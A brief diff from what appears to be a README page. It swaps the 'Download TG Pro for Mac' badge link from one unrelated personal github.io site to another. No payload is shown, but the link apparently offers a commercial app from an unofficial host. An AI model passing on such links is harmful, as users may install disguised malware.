@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-  <a href="https://manhyusuu48.github.io/.github/TGPro">
+  <a href="https://tembilamusion.github.io/.github/TGPro">
     <img src="https://img.shields.io/badge/⬇️_Download_TG_Pro_for_Mac-black?style=for-the-badge&logo=apple" alt="Download TG Pro for macOS">  
   </a>  
 </div>  
